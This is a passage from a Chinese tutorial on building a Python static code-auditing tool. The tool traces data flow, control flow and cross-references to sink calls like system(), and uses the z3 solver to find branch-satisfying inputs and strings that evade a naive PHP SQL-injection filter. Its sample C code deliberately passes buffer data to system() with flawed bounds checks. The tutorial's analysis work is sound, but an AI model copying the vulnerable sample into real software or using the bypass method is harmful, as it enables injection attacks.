        if subnode_index[1] == None :  #  Fix cparser Bug , Maybe Some Node is None ..
            continue

        if 'function_call' == subnode_index[1].type :
            if find_function_name == '*' or find_function_name == subnode_index[1].value :
                parameters_list = get_function_parameters(subnode_index[1])

                find_result.append((subnode_index,parameters_list))

        find_result += recursive_find_call(subnode_index[1],find_function_name)

    return find_result

def xref_function(code_stream,search_function_name) :
    search_xref_data = {}

    for function_name in code_stream.keys() :
        function_code = code_stream[function_name]
        search_result = recursive_find_call(function_code,search_function_name)

        if not search_result :
            continue

        xref_record = xref_function(code_stream,function_name)  #  Recursive find function's Xref ..
        search_xref_data[function_name] = {
            'xref' : xref_record ,
            'reference' : search_result ,
        }

    return search_xref_data


print xref_function(code_stream,'execute_command')


</code></pre>
<p>输出结果如下,因为<code>execute_command()</code> 只被<code>buffer_resolver()</code> 这个函数引用,所以只输出这一个结果.</p>
<p><img src="pic6/pic18.png" alt="" /></p>
<p>为了结果更明显,我们搜索<code>system()</code> 函数.</p>
<pre><code class="language-python">
print xref_function(code_stream,'system')

</code></pre>
<p>运行结果如下:</p>
<p><img src="pic6/pic19.png" alt="" /></p>
<h3 id="综合分析"><a class="header" href="#综合分析">综合分析</a></h3>
<p>综合分析阶段我们主要运用以上的四个步骤对源码进行扫描:匹配漏洞-&gt;函数内部数据流跟踪-&gt;控制流跟踪-&gt;交叉引用.有了上面已经写好的功能代码,接下来就是按照逻辑来拼装代码了,Talk is Cheap ,Show you the code :</p>
<p>首先是要修复cparse 库不能对函数参数进行解析的问题,因为我们除了要在函数内部代码定位数据流,最后也需要定位到函数参数中去,故在此先添加第一部分代码</p>
<pre><code class="language-python">
def resolver_function_parameter(code_string) :
    code_string = code_string.strip()
    code_block_declare_offset = code_string.find('{')

    if -1 == code_block_declare_offset :
        return False

    try :
        function_declare_string = code_string[ : code_block_declare_offset ].strip()
        function_return_type = function_declare_string.split(' ')[0]
        function_name = function_declare_string.split('(')[0]
        function_name = function_name.split(' ')[1]
        function_parameters_string = function_declare_string.split('(')[1].strip()
        function_parameters_string = function_parameters_string.split(')')[0].strip()
        resolve_function_parameters_list = function_parameters_string.split(',')
        function_parameters_list = []

        for resolve_function_parameters_index in resolve_function_parameters_list :
            function_parameters_list.append({
                'type' : resolve_function_parameters_index[ : resolve_function_parameters_index.rfind(' ') ] ,
                'name' : resolve_function_parameters_index.split(' ')[-1] ,
            })

        return {
            'type' : function_return_type ,
            'name' : function_name ,
            'parameters' : function_parameters_list ,
        }
    except :
        pass

    return False


code_stream = {
    'global_enum' : {
        'code' : cparser.get_func_tree(code_emun) ,
        'declare' : resolver_function_parameter(code_emun) ,
    } ,
    'decrypt_data' : {
        'code' : cparser.get_func_tree(code_decrypt_data) ,
        'declare' : resolver_function_parameter(code_decrypt_data) ,
    } ,
    'execute_command' : {
        'code' : cparser.get_func_tree(code_execute_command) ,
        'declare' : resolver_function_parameter(code_execute_command) ,
    } ,
    'buffer_resolver' : {
        'code' : cparser.get_func_tree(code_buffer_resolver) ,
        'declare' : resolver_function_parameter(code_buffer_resolver) ,
    } ,
}

# ...

def xref_function(code_stream,search_function_name) :
    search_xref_data = {}

    for function_name in code_stream.keys() :
        function_code = code_stream[function_name]['code']  #  Get Code from code_stream .
        search_result = recursive_find_call(function_code,search_function_name)

        if not search_result :
            continue

        xref_record = xref_function(code_stream,function_name)
        search_xref_data[function_name] = {
            'xref' : xref_record ,
            'reference' : search_result ,
        }

    return search_xref_data


</code></pre>
<p>然后为了让<code>search_call_by_strategy()</code> 减少输出无用的结果,在此加入了对搜索结果的内容是否为空进行筛选:</p>
<pre><code class="language-python">
def search_call_by_strategy(search_strategy,code_object) :
    search_strategy = resolve_strategy(search_strategy)
    search_record = {}

    for search_strategy_index in search_strategy :  #  Search Call by Strategy
        find_function_name = search_strategy_index[0]
        search_check_parameter_list = search_strategy_index[1]
        find_function_call = recursive_find_call(code_object,find_function_name)
        search_record_list = []

        print_search_result(find_function_call)

        for call_index in find_function_call :  #  Find Match Strategy Call
            ast_node_info = call_index[0]
            parameters_list = call_index[1]

            if search_check_parameter_list :
                check_parameter_list = []

                for search_check_parameter_index in search_check_parameter_list :  #  Filter Call Argument
                    if len(parameters_list) &lt;= search_check_parameter_index :
                        continue

                    target_search_parameter = parameters_list[search_check_parameter_index]

                    if not target_search_parameter['type'] in ['variable','address_of'] :  #  Check this Argument is a Variant ..
                        continue

                    check_parameter_list.append(target_search_parameter)

                if check_parameter_list :
                    search_record_list.append((ast_node_info,check_parameter_list))
            else :
                search_record_list.append((ast_node_info,[]))

        if search_record_list :  #  Fix This : If not found function call result so we let it empty (我总感觉这个语法不对。。。)
            search_record[find_function_name] = search_record_list

    return search_record

</code></pre>
<p>接下来我们继续修复数据流分析的代码,支持跟踪到函数参数</p>
<pre><code class="language-python">
def xref_variant(trance_record,bingo_parameter_name,function_declare) :
    xref_record = []

    for trance_record_index in trance_record[ :: -1 ] :
        if trance_record_index[1].type in ['get_element','assign'] :
            if bingo_parameter_name in trance_record_index[1].value :
                xref_record.append({
                    'type' : trance_record_index[1].type ,
                    'value' : trance_record_index[1].value ,
                    'node' : trance_record_index
                })
        elif trance_record_index[1].type == 'function_call' :
            function_parameters = get_function_parameters(trance_record_index[1])

            for function_parameter_index in function_parameters :
                if not bingo_parameter_name in function_parameter_index['value'] :
                    continue

                xref_record.append({
                    'type' : trance_record_index[1].type ,
                    'value' : trance_record_index[1].value ,
                    'node' : trance_record_index
                })

    for function_parameter_index in function_declare['parameters'] :  #  Add this
        function_parameter_name = function_parameter_index['name']

        if not bingo_parameter_name == function_parameter_name :
            continue

        xref_record.append({
            'type' : 'parameter' ,
            'value' : function_parameter_name ,
            'node' : None
        })

    return xref_record

def trance_record_by_ast(start_node,target_node,bingo_parameters,function_declare,trance_record) :  #  Add new Parameter : function_declare
    code_record = []

    for node_object_index in start_node.subnode :
        if node_object_index == target_node :
            xref_record_list = []

            for bingo_parameter_index in bingo_parameters :
                xref_record_list.append(xref_variant(trance_record + code_record,bingo_parameter_index['value'],function_declare))

            return (True,xref_record_list)

        code_record.append(node_object_index)

        is_search,sub_data = trance_record_by_ast(node_object_index[1],target_node,bingo_parameters,function_declare,trance_record + code_record)

        if is_search :
            xref_record_list = sub_data

            return (True,xref_record_list)

        sub_code_record = sub_data
        code_record += sub_code_record

    return (False,code_record)

</code></pre>
<p>组合这些代码,我们可以进行基本的漏洞匹配和回溯功能了.</p>
<pre><code class="language-python">
search_strategy = 'system(*)'
search_record_list = []

for function_name in code_stream.keys() :
    search_record = search_call_by_strategy(search_strategy,code_stream[function_name]['code'])

    #print 'Search Record :',search_record

    if not search_record :
        continue

    search_record_list.append({
        'function_name' : function_name ,
        'record' : search_record ,
    })

for search_record_index in search_record_list :
    xref_reference_function_name = search_record_index['function_name']
    reference_record_list = search_record_index['record']

    for reference_function_name in reference_record_list.keys() :
        reference_point_list = reference_record_list[reference_function_name]

        for reference_point in reference_point_list :
            code_object = code_stream[xref_reference_function_name]['code']
            code_function_declare = code_stream[xref_reference_function_name]['declare']
            reference_point_ast_node = reference_point[0]
            reference_variant_list = reference_point[1]
            control_flow_list = trance_control_flow_by_ast(code_object,reference_point_ast_node,[])
            data_flow_list = trance_record_by_ast(code_object,reference_point_ast_node,reference_variant_list,code_function_declare,[])
            xref_function_list = xref_function(code_stream,xref_reference_function_name)

            print 'reference_point',reference_point
            print 'control_flow_list',control_flow_list
            print 'data_flow_list',data_flow_list
            print 'xref_function_list',xref_function_list

</code></pre>
<p>运行结果如下:</p>
<p><img src="pic6/pic20.png" alt="" /></p>
<p>接下来我们继续拓展深度递归功能,把上面的分析代码再修改</p>
<pre><code class="language-python">
def deep_trance(reference_point_list,xref_reference_function_name,current_function_name) :
    trance_record = {}
    #print 'deep_trance  :  ',current_function_name,'-&gt;',xref_reference_function_name

    for reference_point in reference_point_list :
        code_object = code_stream[xref_reference_function_name]['code']
        code_function_declare = code_stream[xref_reference_function_name]['declare']
        reference_point_ast_node = reference_point[0]
        reference_variant_list = reference_point[1]
        control_flow_list = trance_control_flow_by_ast(code_object,reference_point_ast_node,[])[1]
        data_flow_list = trance_record_by_ast(code_object,reference_point_ast_node,reference_variant_list,code_function_declare,[])[1]
        xref_function_list = xref_function(code_stream,xref_reference_function_name)
        xref_record_list = []

        for xref_function_name in xref_function_list.keys() :
            xref_function_object = xref_function_list[xref_function_name]

            xref_record_list.append(deep_trance(xref_function_object['reference'],xref_function_name,xref_reference_function_name))

        trance_record[xref_reference_function_name] = {
            'data_flow' : data_flow_list ,
            'control_flow' : control_flow_list ,
            'xref' : xref_record_list ,
        }

    return trance_record


search_strategy = 'system(*)'
search_record_list = []

for function_name in code_stream.keys() :
    search_record = search_call_by_strategy(search_strategy,code_stream[function_name]['code'])

    if not search_record :
        continue

    search_record_list.append({
        'function_name' : function_name ,
        'record' : search_record ,
    })

for search_record_index in search_record_list :
    xref_reference_function_name = search_record_index['function_name']
    reference_record_list = search_record_index['record']

    for reference_function_name in reference_record_list.keys() :
        reference_point_list = reference_record_list[reference_function_name]

        print 'Xref-Search for',reference_function_name,'deep_trance() Result :'
        print deep_trance(reference_point_list,xref_reference_function_name,reference_function_name)

</code></pre>
<p>搜索输出结果如下:</p>
<p><img src="pic6/pic21.png" alt="" /></p>
<h3 id="判断求解"><a class="header" href="#判断求解">判断求解</a></h3>
<p>静态代码分析的最后一部分就是尝试对控制流进行求解了,前面我们已经可以从<code>system(*)</code> 策略中指定一个敏感参数然后向上溯源(在此为了方便演示,没有对数据输入来源进行可控判断[比如判断是不是可以接受$_GET[],$_POST[],$_COOKIE[] 中接收到的数据],读者们有意可以自行完善),其实这对于自动化白盒审计来说还是不足的,接下来我们尝试对判断进行求解,让程序可以计算满足输入条件的内容.</p>
<p>我们先来一些简单的条件约束来探索,这是一段简单的对两个输入变量的判断</p>
<pre><code class="language-c">
int main(int argc,int argv) {
    a = atoi(argv[1]);  //  atoi() 的意思是转换字符串到数字
    b = atoi(argv[2]);

    if (a &lt; 10) {
      if (b &gt;= 5) {
        printf(&quot;niubi&quot;);
      } else {
        printf(&quot;666&quot;);
      }
    } else {
      if (b &lt; 4) {
        printf(&quot;777&quot;);
      } else if (b == 5) {
        printf(&quot;?&quot;);
      } else {
        printf(&quot;so diao&quot;);
      }
    }

    return 1;
}

</code></pre>
<p>对应的程序流程图如下:</p>
<p><img src="pic6/pic22.png" alt="" /></p>
<p>如果想要程序满足条件输出&quot;niubi&quot; ,那么a 的值需要小于10 且b 的值大于等于5 .那么我们用z3 来尝试对此进行条件求解,代码如下:</p>
<pre><code class="language-python">
from z3 import *


a = Int('a')
b = Int('b')
solver = Solver()

solver.add(a &lt; 10)
solver.add(b &gt;= 5)
solver.check()

result = solver.model()

print result

</code></pre>
<p>输出结果如下:</p>
<p><img src="pic6/pic23.png" alt="" /></p>
<p>了解原理后,我们用这段示例代码来进行审计,然后对判断进行求解.先对原有的函数代码继续完善.</p>
<pre><code class="language-python">
def search_call_by_strategy(search_strategy,code_object) :
    search_strategy = resolve_strategy(search_strategy)
    search_record = {}

    for search_strategy_index in search_strategy :  #  Search Call by Strategy
        find_function_name = search_strategy_index[0]
        search_check_parameter_list = search_strategy_index[1]
        find_function_call = recursive_find_call(code_object,find_function_name)
        search_record_list = []

        print_search_result(find_function_call)

        for call_index in find_function_call :  #  Find Match Strategy Call
            ast_node_info = call_index[0]
            parameters_list = call_index[1]

            if search_check_parameter_list :
                check_parameter_list = []

                for search_check_parameter_index in search_check_parameter_list :  #  Filter Call Argument
                    if len(parameters_list) &lt;= search_check_parameter_index :
                        continue

                    target_search_parameter = parameters_list[search_check_parameter_index]

                    if not target_search_parameter['type'] in ['variable','address_of','string'] :  #  Fix there , add check string
                        continue

                    check_parameter_list.append(target_search_parameter)

                if check_parameter_list :
                    search_record_list.append((ast_node_info,check_parameter_list))
            else :
                search_record_list.append((ast_node_info,[]))

        if search_record_list :
            search_record[find_function_name] = search_record_list

    return search_record


def trance_control_flow_by_ast(start_node,target_node,trance_record) :
    other_if_condition = []

    for node_object_index in start_node.subnode :
        if node_object_index == target_node :
            if_block_list = {}
            if_block_depth = 0
            control_flow_list = []

            for trance_record_index in trance_record :
                #print trance_record_index[0],trance_record_index[1].type,trance_record_index[1].value

                if trance_record_index[0] in ['if','ifbody','condition'] :
                    condition_data = get_condition(trance_record_index[1])

                    if not condition_data :
                        continue

                    if_block_depth += 1
                    if_block_list[if_block_depth] = [ condition_data ]
                elif trance_record_index[0] == 'elsebody' :
                    condition_data = get_condition(trance_record_index[1])

                    if not condition_data :
                        if_condition_list = if_block_list[if_block_depth]

                        for if_condition_index in range(len(if_condition_list)) :
                            if_condition_list[if_condition_index] = '!(%s)' % if_condition_list[if_condition_index]

                        if_block_list[if_block_depth] = if_condition_list
                        if_block_depth -= 1

                        if not if_block_depth :
                            for if_block_index in if_block_list.values() :
                                control_flow_list += if_block_index

                            if_block_list = {}
                    else :
                        if_block_list[if_block_depth][-1] = '!(%s)' % if_block_list[if_block_depth][-1]
                        if_block_list[if_block_depth].append(condition_data)

            if if_block_list :
                for if_block_index in if_block_list.values() :
                    control_flow_list += if_block_index

            return (True,control_flow_list)

        is_search = False

        if node_object_index[0] == 'if' :
            other_if_condition = [ node_object_index ]
            is_search,sub_data = trance_control_flow_by_ast(node_object_index[1],target_node,trance_record + other_if_condition)
        elif node_object_index[0] in ['ifbody','elsebody'] :
            other_if_condition.append(node_object_index)
            is_search,sub_data = trance_control_flow_by_ast(node_object_index[1],target_node,trance_record + other_if_condition)

        if is_search :
            control_flow_record_list = sub_data

            return (True,control_flow_record_list)

    return (False,None)

</code></pre>
<p>接口功能代码写好之后,接下来就是实现逻辑代码:</p>
<pre><code class="language-python">
from z3 import *


def adjust_calculate(calculate_string) :
    if calculate_string.startswith('!(') :
        calculate_string = calculate_string[ calculate_string.find('!(') + 2 : calculate_string.rfind(')') ]
        calculate_string = calculate_string.replace('==','!=')
        #calculate_string = calculate_string.replace('!=','==')  #  ...
        calculate_string = calculate_string.replace('&lt;','&gt;=')
        calculate_string = calculate_string.replace('&gt;','&lt;=')
        calculate_string = calculate_string.replace('&gt;=','&lt;')
        calculate_string = calculate_string.replace('&lt;=','&gt;')

    return calculate_string


test_code = '''
int main(int argc,int argv) {
    a = atoi(argv[1]);
    b = atoi(argv[2]);

    if (a &lt; 10) {
      if (b &gt;= 5) {
        printf(&quot;niubi&quot;);
      } else {
        printf(&quot;666&quot;);
      }
    } else {
      if (b &lt; 4) {
        printf(&quot;777&quot;);
      } else if (b == 5) {
        printf(&quot;?&quot;);
      } else {
        printf(&quot;so diao&quot;);
      }
    }

    return 1;
}
'''

#  Tips : cParser have a bug ,you need to setting for every code block .if don't do that ,some if / else condition will resolve except ..

code_object = cparser.get_func_tree(test_code)
search_record = search_call_by_strategy('printf(*)',code_object)

for search_function_name in search_record.keys() :
    search_record_object = search_record[search_function_name]

    for reference_point in search_record_object :
        control_flow_list = trance_control_flow_by_ast(code_object,reference_point[0],[])[1]

        a = Int('a')
        b = Int('b')
        solver = Solver()

        print control_flow_list

        for control_flow_index in control_flow_list :
            exec('solver.add(' + adjust_calculate(control_flow_index) + ')')  #  Z3 solver.add() just only support condition that is not string .

        solver.check()

        print 'Result :',solver.model()


</code></pre>
<p>运行效果如下:</p>
<p><img src="pic6/pic24.png" alt="" /></p>
<p>对于整数的求解还是相对较为简单的,因为对整数的求解是<strong>连续</strong>的,这个很容易计算,但是对于内存区域来说变化就非常多了,而且各个内存的字节是<strong>不连续</strong>的,这就导致使求解的难度增高了不少.我们用图例来讲解:</p>
<p>对于一个字符串进行内容过滤/检测限制,实质是在字符串上搜索有没有存在特定的内容,比如我们要进行SQL 注入防护,可以对单引号和and 进行字符串过滤</p>
<pre><code class="language-php">
$user_id = str_replace(&quot;'&quot;,&quot;&quot;,$_GET['id']);
$user_id = str_replace(&quot;and&quot;,&quot;&quot;,$user_id);

</code></pre>
<p><code>str_replace()</code> 会对在字符串上一步一步地搜索匹配指定的内容.</p>
<p><img src="pic6/pic25.png" alt="" /></p>
<p>翻译到条件求解,也就是说各个字节都存在一个合并的判断,如果第一个字节为a ,那么再判断后一字节是否为n ,然后再判断最后一字节是不是d .那么可以把他们合并条件约束:<code>str[0] != 'a' &amp;&amp; str[1] != 'n' &amp;&amp; str[2] != 'd'</code>;对于后一字节,同样进行条件约束:<code>str[1] != 'a' &amp;&amp; str[2] != 'n' &amp;&amp; str[3] != 'd'</code>,一直到n-2 字节.</p>
<p><img src="pic6/pic26.png" alt="" /></p>
<p>我们可以尝试在判断求解的时候对数据内容进行一个假定,假设某处内容为a ,b ,c 并赋予到指定的buffer 空间中尝试进行求解,这个过程就是Fuzzing ,只不过通常我们是用程序执行来跑判断,而现在使用求解器来跑判断.</p>
<p><img src="pic6/pic27.png" alt="" /></p>
<p>先来构造一个简单的buffer ,然后对buffer 的内容做一些基本的条件限制.</p>
<pre><code class="language-python">
byte1 = BitVec('byte1',8)
byte2 = BitVec('byte2',8)
byte3 = BitVec('byte3',8)
solver = Solver()

solver.add(Or(And(65 &lt;= byte1,byte1 &lt;= 65+25),And(105 &lt;= byte1,byte1 &lt;= 105+25)))
solver.add(Or(And(65 &lt;= byte2,byte2 &lt;= 65+25),And(105 &lt;= byte2,byte2 &lt;= 105+25)))
solver.add(Or(And(65 &lt;= byte3,byte3 &lt;= 65+25),And(105 &lt;= byte3,byte3 &lt;= 105+25)))
solver.add(byte1 != ord('A'),byte2 != ord('N'),byte3 != ord('D'))

solver.check()

result = solver.model()

for index in result :
    print chr(result[index].as_long()) ,

</code></pre>
<p>运行结果如下:</p>
<p><img src="pic6/pic28.png" alt="" /></p>
<p>因为在SQL 注入中是需要依赖特点的字符串组合来触发漏洞的,所以我们在此需要构建一段可以触发问题的测试Payload</p>
<pre><code class="language-python">
byte1 = BitVec('byte1',8)
byte2 = BitVec('byte2',8)
byte3 = BitVec('byte3',8)
solver = Solver()

solver.add(Or(And(65 &lt;= byte1,byte1 &lt;= 65+25),And(105 &lt;= byte1,byte1 &lt;= 105+25)))
solver.add(Or(And(65 &lt;= byte2,byte2 &lt;= 65+25),And(105 &lt;= byte2,byte2 &lt;= 105+25)))
solver.add(Or(And(65 &lt;= byte3,byte3 &lt;= 65+25),And(105 &lt;= byte3,byte3 &lt;= 105+25)))
solver.add(byte1 != ord('A'),byte2 != ord('N'),byte3 != ord('D'))
solver.add(byte1 == ord('O'),byte2 != ord('r'))

solver.check()

result = solver.model()

print chr(result[byte1].as_long()) ,
print chr(result[byte2].as_long()) ,
print chr(result[byte3].as_long()) ,

</code></pre>
<p>运行结果如下:</p>
<p><img src="pic6/pic29.png" alt="" /></p>
<p>对字符串的求解的基本原理就是这样了,读者们有兴趣可以尝试利用上面的代码对<code>system()</code> 进行求解.</p>
<h2 id="附录一----各图的graphiz-生成代码"><a class="header" href="#附录一----各图的graphiz-生成代码">附录一 -- 各图的Graphiz 生成代码</a></h2>
<p>在线生成Graphiz . http://dreampuf.github.io/GraphvizOnline/</p>
<pre><code class="language-txt">digraph G {

  function_buffer_resolver[shape=box,label=&quot;function_buffer_resolver&quot;,style=filled,fillcolor=&quot;#ABACBA&quot;];
  buffer[label=&quot;argument_buffer&quot;];
  buffer_length[label=&quot;variant_buffer_length&quot;];
  buffer_type[label=&quot;condition_buffer_type&quot;];
  const_message_type_hello[label=&quot;const_message_type_hello&quot;];
  const_message_type_execute[label=&quot;const_message_type_execute&quot;];
  const_message_type_data[label=&quot;const_message_type_data&quot;];
  command_buffer[label=&quot;variant_command_buffer&quot;];
  function_execute_command[shape=box,label=&quot;function_execute_command&quot;,style=filled,fillcolor=&quot;#ABACBA&quot;];
  function_decrypt_data[shape=box,label=&quot;function_decrypt_data&quot;,style=filled,fillcolor=&quot;#ABACBA&quot;];

  function_buffer_resolver-&gt;buffer [label=&quot;Function Argument &quot;,style=bold,color=green];

  buffer-&gt;buffer_length [label=&quot;Access buffer[0] &quot;,style=bold,color=violet];
  buffer-&gt;buffer_type [label=&quot;Access buffer[1] &quot;,style=bold,color=violet];

  buffer_type-&gt;const_message_type_hello [label=&quot;Check Condition &quot;,style=bold];
  buffer_type-&gt;const_message_type_execute [label=&quot;Check Condition &quot;,style=bold];
  buffer_type-&gt;const_message_type_data [label=&quot;Check Condition &quot;,style=bold];

  buffer_length-&gt;command_buffer [label=&quot;Alloc memory&quot;,style=bold,color=violet];
  command_buffer-&gt;command_buffer [label=&quot;memset zero&quot;,style=bold,color=blue];
  buffer-&gt;command_buffer [label=&quot;memcpy from buffer&quot;,style=bold,color=violet];

  command_buffer-&gt;function_execute_command [label=&quot;Call function&quot;,style=bold,color=red];
  buffer-&gt;function_decrypt_data [label=&quot;Call function&quot;,style=bold,color=red];

}
</code></pre>
<pre><code class="language-txt">digraph G {

    function_buffer_resolver[shape=box,label=&quot;function_buffer_resolver&quot;,style=filled,fillcolor=&quot;#ABACBA&quot;];
    buffer[label=&quot;argument_buffer&quot;];
    command[label=&quot;argument_buffer&quot;];
    command_buffer[label=&quot;variant_command_buffer&quot;];
    function_execute_command[shape=box,label=&quot;function_execute_command&quot;,style=filled,fillcolor=&quot;#ABACBA&quot;];

    function_buffer_resolver-&gt;buffer [label=&quot;Function Argument &quot;,style=bold,color=green,dir=&quot;back&quot;];

    buffer-&gt;command_buffer [label=&quot;memcpy from buffer&quot;,style=bold,color=violet,dir=&quot;back&quot;];

    command_buffer-&gt;function_execute_command [label=&quot;Push data to function argument&quot;,style=bold,color=red,dir=&quot;back&quot;];
    function_execute_command-&gt;command [label=&quot;Function Argument &quot;,style=bold,color=green];

}
</code></pre>
<pre><code class="language-txt">digraph G {

    input_id [shape=box,label=&quot;input_get_id&quot;];
    variant_user_id [label=&quot;variant_user_id&quot;];
    variant_temp_string1 [label=&quot;variant_temp_string1&quot;];
    variant_temp_string2 [label=&quot;variant_temp_string2&quot;];
    function_sql_query [shape=box,label=&quot;function_sql_query&quot;,style=filled,fillcolor=&quot;#ABACBA&quot;];
    function_echo [shape=box,label=&quot;function_echo&quot;,style=filled,fillcolor=&quot;#ABACBA&quot;];

    input_id-&gt;variant_user_id [label=&quot;Save data to Variant&quot;,style=bold,color=violet];
    variant_user_id-&gt;variant_temp_string1 [label=&quot;Build SQL Query String&quot;,style=bold,color=violet];
    variant_temp_string1-&gt;function_sql_query [label=&quot;Call Function&quot;,style=bold,color=red];
    variant_user_id-&gt;variant_temp_string2 [label=&quot;Build Echo String&quot;,style=bold,color=violet];
    variant_temp_string2-&gt;function_echo [label=&quot;Call Function&quot;,style=bold,color=red];

}
</code></pre>
<pre><code class="language-txt">digraph G {

    input_id [shape=box,label=&quot;input_get_id&quot;];
    variant_user_id [label=&quot;variant_user_id&quot;];
    variant_temp_string1 [label=&quot;variant_temp_string1&quot;];
    function_sql_query [shape=box,label=&quot;function_sql_query&quot;,style=filled,fillcolor=&quot;#ABACBA&quot;];

    input_id-&gt;variant_user_id [label=&quot;Save data to Variant&quot;,style=bold,color=violet,dir=&quot;back&quot;];
    variant_user_id-&gt;variant_temp_string1 [label=&quot;Build SQL Query String&quot;,style=bold,color=violet,dir=&quot;back&quot;];
    variant_temp_string1-&gt;function_sql_query [label=&quot;Call Function&quot;,style=bold,color=red,dir=&quot;back&quot;];

}
</code></pre>
<pre><code class="language-txt">
digraph G {

  function_buffer_resolver[shape=box,label=&quot;function_buffer_resolver&quot;,style=filled,fillcolor=&quot;#ABACBA&quot;];
  basic_block_entry[shape=box,style=filled,fillcolor=&quot;#BCABCA&quot;];
  basic_block_1[shape=box,style=filled,fillcolor=&quot;#BCABCA&quot;];
  basic_block_2[shape=box,style=filled,fillcolor=&quot;#BCABCA&quot;];
  basic_block_3[shape=box,style=filled,fillcolor=&quot;#BCABCA&quot;];
  basic_block_4[shape=box,style=filled,fillcolor=&quot;#BCABCA&quot;];
  basic_block_5[shape=box,style=filled,fillcolor=&quot;#BCABCA&quot;];
  basic_block_6[shape=box,style=filled,fillcolor=&quot;#BCABCA&quot;];
  condition_1[shape=diamond,style=filled,fillcolor=&quot;#666666&quot;];
  condition_2[shape=diamond,style=filled,fillcolor=&quot;#666666&quot;];
  condition_3[shape=diamond,style=filled,fillcolor=&quot;#666666&quot;];
  condition_4[shape=diamond,style=filled,fillcolor=&quot;#666666&quot;];

  function_buffer_resolver-&gt;basic_block_entry;
  basic_block_entry-&gt;condition_1[label=&quot;2 &lt;= buffer_length&quot;];
  condition_1-&gt;basic_block_1[label=&quot;No&quot;];
  condition_1-&gt;basic_block_2[label=&quot;Yes&quot;];
  basic_block_2-&gt;condition_2[label=&quot;MessageType_Hello == buffer[1]&quot;];
  condition_2-&gt;basic_block_3[label=&quot;Yes&quot;];
  condition_3-&gt;basic_block_4[label=&quot;Yes&quot;];
  condition_4-&gt;basic_block_5[label=&quot;Yes&quot;];
  condition_2-&gt;condition_3[label=&quot;No ,Check MessageType_Execute == buffer[1]&quot;];
  condition_3-&gt;condition_4[label=&quot;No ,Check MessageType_Data == buffer[1]&quot;];
  condition_4-&gt;basic_block_6[label=&quot;No&quot;];
  basic_block_3-&gt;basic_block_6;
  basic_block_4-&gt;basic_block_6;
  basic_block_5-&gt;basic_block_6;

}

</code></pre>
<pre><code class="language-txt">
digraph G {

  user_input[shape=box,style=filled,fillcolor=&quot;#EEEEEE&quot;];
  a[shape=box,style=filled,fillcolor=&quot;#ABACBA&quot;];
  b[shape=box,style=filled,fillcolor=&quot;#ABACBA&quot;];
  basic_block_1[shape=box,style=filled,fillcolor=&quot;#BCABCA&quot;];
  basic_block_2[shape=box,style=filled,fillcolor=&quot;#BCABCA&quot;];
  basic_block_3[shape=box,style=filled,fillcolor=&quot;#BCABCA&quot;];
  basic_block_4[shape=box,style=filled,fillcolor=&quot;#BCABCA&quot;];
  basic_block_5[shape=box,style=filled,fillcolor=&quot;#BCABCA&quot;];
  basic_block_6[shape=box,style=filled,fillcolor=&quot;#BCABCA&quot;];
  condition_1[shape=diamond,style=filled,fillcolor=&quot;#666666&quot;];
  condition_2[shape=diamond,style=filled,fillcolor=&quot;#666666&quot;];
  condition_3[shape=diamond,style=filled,fillcolor=&quot;#666666&quot;];
  condition_4[shape=diamond,style=filled,fillcolor=&quot;#666666&quot;];

  user_input-&gt;a;
  user_input-&gt;b;
  a-&gt;condition_1;
  b-&gt;condition_1;

  condition_1-&gt;condition_2[label=&quot;Yes&quot;];
  condition_2-&gt;basic_block_1[label=&quot;Yes&quot;];
  condition_2-&gt;basic_block_2[label=&quot;No&quot;];
  condition_1-&gt;condition_3[label=&quot;No&quot;];
  condition_3-&gt;basic_block_3[label=&quot;Yes&quot;];
  condition_3-&gt;condition_4[label=&quot;No&quot;];
  condition_4-&gt;basic_block_4[label=&quot;Yes&quot;];
  condition_4-&gt;basic_block_5[label=&quot;No&quot;];
  basic_block_1-&gt;basic_block_6;
  basic_block_2-&gt;basic_block_6;
  basic_block_3-&gt;basic_block_6;
  basic_block_4-&gt;basic_block_6;
  basic_block_5-&gt;basic_block_6;

}

</code></pre>
<h2 id="附录二----静态审计工具完整源码"><a class="header" href="#附录二----静态审计工具完整源码">附录二 -- 静态审计工具完整源码</a></h2>
<pre><code class="language-python">

import json

import cparser


code_emun = '''
enum {
  MessageType_Hello = 0,
  MessageType_Execute,
  MessageType_Data
};
'''

code_execute_command = '''
void execute_command(const unsigned char* command) {
    system(command);
}
'''

code_decrypt_data = '''
void decrypt_data(const unsigned char* data_buffer,unsigned char data_buffer_length) {
    unsigned char* buffer[8] = {0};

    for (unsigned int data_index = 0;data_index &lt; data_buffer_length;++data_index)
        buffer[data_index] = data_buffer[data_index] ^ 0x65;

    printf(&quot;Recv:%s\n&quot;,&amp;buffer);
}
'''

code_buffer_resolver = '''
int buffer_resolver(const unsigned char* buffer) {
    unsigned char buffer_length = buffer[0];

    if (2 &lt;= buffer_length)
        return 0;

    if (MessageType_Hello == buffer[1]) {
        printf(&quot;Hello\n&quot;);
    } else if (MessageType_Execute == buffer[1]) {
        unsigned char* command_buffer = (unsigned char*)malloc(buffer_length - 1);

        memset(&amp;command_buffer,0,buffer_length);
        memcpy(&amp;command_buffer,&amp;buffer[2],buffer_length - 2);

        execute_command(command_buffer);
    } else if (MessageType_Data == buffer[1]) {
        decrypt_data(&amp;buffer[2],buffer_length - 2);
    }

    return 1;
}
'''


def resolver_function_parameter(code_string) :
    code_string = code_string.strip()
    code_block_declare_offset = code_string.find('{')

    if -1 == code_block_declare_offset :
        return False

    try :
        function_declare_string = code_string[ : code_block_declare_offset ].strip()
        function_return_type = function_declare_string.split(' ')[0]
        function_name = function_declare_string.split('(')[0]
        function_name = function_name.split(' ')[1]
        function_parameters_string = function_declare_string.split('(')[1].strip()
        function_parameters_string = function_parameters_string.split(')')[0].strip()
        resolve_function_parameters_list = function_parameters_string.split(',')
        function_parameters_list = []

        for resolve_function_parameters_index in resolve_function_parameters_list :
            function_parameters_list.append({
                'type' : resolve_function_parameters_index[ : resolve_function_parameters_index.rfind(' ') ] ,
                'name' : resolve_function_parameters_index.split(' ')[-1] ,
            })

        return {
            'type' : function_return_type ,
            'name' : function_name ,
            'parameters' : function_parameters_list ,
        }
    except :
        pass

    return False


code_stream = {
    'global_enum' : {
        'code' : cparser.get_func_tree(code_emun) ,
        'declare' : resolver_function_parameter(code_emun) ,
    } ,
    'decrypt_data' : {
        'code' : cparser.get_func_tree(code_decrypt_data) ,
        'declare' : resolver_function_parameter(code_decrypt_data) ,
    } ,
    'execute_command' : {
        'code' : cparser.get_func_tree(code_execute_command) ,
        'declare' : resolver_function_parameter(code_execute_command) ,
    } ,
    'buffer_resolver' : {
        'code' : cparser.get_func_tree(code_buffer_resolver) ,
